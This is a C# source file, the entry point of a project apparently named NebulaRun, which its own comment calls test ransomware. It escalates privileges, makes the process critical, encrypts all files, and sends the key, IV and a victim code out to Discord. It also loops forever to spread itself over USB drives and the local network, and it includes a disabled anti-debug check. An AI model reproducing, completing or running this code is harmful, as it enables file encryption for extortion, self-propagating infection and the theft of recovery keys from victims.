using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NebulaRun
{ //reminder: this was just a test ransomware
    static class Program
    {
        [STAThread]
        static async Task Main()
        {
           
            AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;

            
            // await AntiDebug.CheckAndKillAsync(); disabled for test

            try
            {
                
                UAC.Start();

               
                CriticP.MakeCritical();

              
                Nbl.EncryptAll();

                await Task.Delay(4000);

                string base64Key = Nbl.GetBase64Key();
                string base64IV = Nbl.GetBase64IV();
                string victimCode = Nbl.VictimCode;


                await Send.SendToDiscordAsync(base64Key, base64IV, victimCode);
            }
            catch (Exception ex)
            {
                
                Debug.WriteLine("Main Init Error: " + ex.Message);
            }

            
            _ = Task.Run(LoopUsbSpread);
            _ = Task.Run(LoopLANSpread);

            
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Nbl());
        }

        private static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
        {
            string resourceName = "NebulaRun." + new AssemblyName(args.Name).Name + ".dll";

            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
            {
                if (stream == null)
                    return null;

                byte[] assemblyData = new byte[stream.Length];
                stream.Read(assemblyData, 0, assemblyData.Length);
                return Assembly.Load(assemblyData);
            }
        }

        static async Task LoopUsbSpread()
        {
            while (true)
            {
                try { UsbSpread.Spread(); } catch { }
                await Task.Delay(1000);
            }
        }

        static async Task LoopLANSpread()
        {
            while (true)
            {
                try { await LAN.SpreadAsync(); } catch { }
                await Task.Delay(1000);
            }
        }
    }
}
